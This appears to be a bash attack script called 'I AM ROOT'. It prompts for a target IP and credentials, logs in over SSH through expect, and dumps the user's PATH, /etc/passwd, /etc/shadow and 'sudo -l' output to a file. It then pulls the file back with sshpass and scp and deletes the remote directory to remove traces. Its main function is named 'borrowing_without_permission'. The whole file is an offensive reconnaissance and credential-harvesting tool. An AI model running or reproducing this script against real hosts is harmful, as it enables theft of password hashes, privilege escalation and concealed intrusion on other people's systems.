#!/bin/bash

# ------------------------------------------------------
# Colors
# Usage: (echo -e or echo -e) "${COLOR}TEXT HERE${NOCOLOR}"
# ------------------------------------------------------
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'
#-------------------------------------------------------



#Ensure the script is being ran as root or with sudo privileges
if [ "$(id -u)" -ne 0 ]; then
	echo -e -e "${CYAN}

    ░▀█▀░█░█░▀█▀░█▀▀░░░█▀▀░█▀▀░█▀▄░▀█▀░█▀█░▀█▀░░░█▄█░█░█░█▀▀░▀█▀░░░█▀▄░█▀▀
    ░░█░░█▀█░░█░░▀▀█░░░▀▀█░█░░░█▀▄░░█░░█▀▀░░█░░░░█░█░█░█░▀▀█░░█░░░░█▀▄░█▀▀
    ░░▀░░▀░▀░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░░░░▀░░░░▀░▀░▀▀▀░▀▀▀░░▀░░░░▀▀░░▀▀▀
    ░█▀▄░█▀█░█▀█░░░█▀█░█▀▀░░░█▀▄░█▀█░█▀█░▀█▀░░░█▀█░█▀▄░░░█▀▀░█░█░█▀▄░█▀█
    ░█▀▄░█▀█░█░█░░░█▀█░▀▀█░░░█▀▄░█░█░█░█░░█░░░░█░█░█▀▄░░░▀▀█░█░█░█░█░█░█
    ░▀░▀░▀░▀░▀░▀░░░▀░▀░▀▀▀░░░▀░▀░▀▀▀░▀▀▀░░▀░░░░▀▀▀░▀░▀░░░▀▀▀░▀▀▀░▀▀░░▀▀▀

    ${NOCOLOR}"
	exit 1
fi

#To create a directory for the script.
#This command needs to stay in this location
HOME=$(pwd)
mkdir $HOME/I_AM_ROOT
echo -e "${ORANGE}THE DIRECTORIE WAS CREATED IN${NOCOLOR} " "${CYAN}$HOME${NOCOLOR}"



sleep 2
echo -e "${RED}

                                  wr^^        ^-q__                             
                               _dP                 9m_     
                             _#P                     9#_                         
                            d#@                       9#m                        
                           d##                         ###                       
                          J###                         ###L                      
                          {###K                       J###K                      
                          ]####K      ___aaa___      J####F                      
                      __gmM######_  w#P^^   ^^9#m  _d#####Mmw__                  
                   _g##############mZ_         __g##############m_               
                 _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
                a###^^          ,Z######@^ ^######^\g          ^^M##m            
               J#@^             0L  ^*##     ##@^  J#              *#K           
               #^               ##    ~_gmwgm_~    dF               ##_          
              7F                 ^#_   ]#####F   _dK                 JE          
              1                    *m__ ##### __g@^                   F          
                                     ^PJ#####LP^                                 
               ^                       0######_                      ^           
                                     _0########_                                   
                   .               _d#####^#####m__              ^
                    ^*w_________am#####P^   ~9#####mw_________w*^
                        ^^9@#####@M^^           ^^P@#####@M^^
 ${NOCOLOR}"

sleep 1
printf '\e[0;31m%-6s\e[m' "$(tput bold)                                                                               
      @@@         @@@@@@   @@@@@@@@@@         @@@@@@@    @@@@@@    @@@@@@   @@@@@@@"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)  
      @@@        @@@@@@@@  @@@@@@@@@@@        @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)        
      @@!        @@!  @@@  @@! @@! @@!        @@!  @@@  @@!  @@@  @@!  @@@    @@!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !@!        !@!  @!@  !@! !@! !@!        !@!  @!@  !@!  @!@  !@!  @!@    !@!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!@        @!@!@!@!  @!! !!@ @!@        @!@!!@!   @!@  !@!  @!@  !@!    @!!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!!        !!!@!!!!  !@!   ! !@!        !!@!@!    !@!  !!!  !@!  !!!    !!!"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)   
      !!:        !!:  !!!  !!:     !!:        !!: :!!   !!:  !!!  !!:  !!!    !!:"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      :!:        :!:  !:!  :!:     :!:        :!:  !:!  :!:  !:!  :!:  !:!    :!:"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)  
       ::        ::   :::  :::     ::         ::   :::  ::::: ::  ::::: ::     ::"
sleep .1
printf '\e[0;31m%-6s\e[m' "$(tput bold)
      :           :   : :   :      :           :   : :   : :  :    : :  :      :     
                                                                               
"


#Function to check IP address is in the proper format
function validateIP(){
    IP_ADDRESS="$1"
    #Check if the format looks rightsdfasdffghdfghfghfg
    echo -e "$IP_ADDRESS" | grep -E -qE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' || return 1
    #Check that each octect is less than or equal to 255:
    echo -e "$IP_ADDRESS" | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <=255 && $4 <= 255 {print "Y" } ' | grep -q Y || return 1
    return 0
}


echo 
sleep 2
#Ask for user input
printf "${GREEN}ENTER IP ADDRESS: ${NOCOLOR}" 
read -r IP_ADDRESS
sleep 1
# While loop to validate the IP provided, if ip is not valid then it will ask for a valid ip
while ! validateIP "$IP_ADDRESS"
do
    printf "${RED}INVALID IP${NOCOLOR}"
    sleep .1
    echo
    echo
    printf "${GREEN}ENTER A VALID IP: ${NOCOLOR}" 
    read -r IP_ADDRESS
done
echo
printf "${GREEN}ENTER USERNAME: ${NOCOLOR}"
read -r USERNAME
echo
printf "${GREEN}ENTER PASSWORD: ${NOCOLOR}" 
read -r PASSWD
sleep 2
echo

SPINVAR1="ATTEMPTING TO CONNECT"
function progress(){

        spin(){
          echo -ne "${GREEN}${SPINVAR1}${NOCOLOR}"
          spin1 &
          pid=$!


          for i in $(seq 1 7)
          do 
            sleep 1
          done

          kill $pid
          echo ""

        }

        spin1(){
          while [ 1 ]
          do
              echo -ne "${GREEN}.${NOCOLOR}"
              sleep 0.2
          done  
        }
        spin
}
progress

#Function with expect commands to ssh into remote host and execute commands. 
# It will attemp to gather info for possible privilge escalation
echo

DIR=/home/$USERNAME/I_AM_ROOT/
F=Info.txt
SND="send \"echo '' >> $DIR${F}\r\""


function borrowing_without_permission {
        expect -c "\
        set timeout 300
        set env(TERM)
        spawn ssh -t "$USERNAME\@$IP_ADDRESS"
        sleep 1
        expect_before \"*(yes/no)?\" {
        send \"yes\r\" 
        send \"$PASSWD\r\"
        }
        sleep 2
        expect \"*assword*\"
        send \"$PASSWD\r\"
        sleep 2
        send \"mkdir ${DIR}\r\"
        sleep 2
        send \"touch $DIR/${F}\r\"
        sleep 1
        send \"echo -e 'I AM ROOT-RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
        ${SND}
        ${SND}
        ${SND}
        sleep 2
        send \"echo '#################### $USERNAME PATH ####################' >> $DIR${F}\r\"
        sleep 2
        ${SND}
        sleep 2
        send \"echo $PATH >> $DIR$F\r\"
        sleep 2
        ${SND}
        send \"echo '#################### /ETC/PASSWD ####################' >> $DIR${F}\r\"
        ${SND}
        send \"cat /etc/passwd >> $DIR$F\r\"
        sleep 2
        ${SND}
        send \"echo '#################### /ETC/SHADOW ####################' >> $DIR${F}\r\"
        ${SND}
        sleep 2
        send \"cat /etc/shadow >> $DIR${F}\r\"
        sleep 2
        send \"echo '#################### SUDO COMMANDS ####################' >> $DIR${F}\r\"
        ${SND}
        sleep 2
        send \"sudo -l >> ${DIR}${F}\r\"
        expect \"*assword*\"
        send \"$PASSWD\r\"
        ${SND}
        send \"exit\r\"
        "
}
borrowing_without_permission

sleep 5
sshpass -p "$PASSWD" scp -r "$USERNAME"@"$IP_ADDRESS":"$DIR" "$HOME"
sleep 5

sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
sleep 3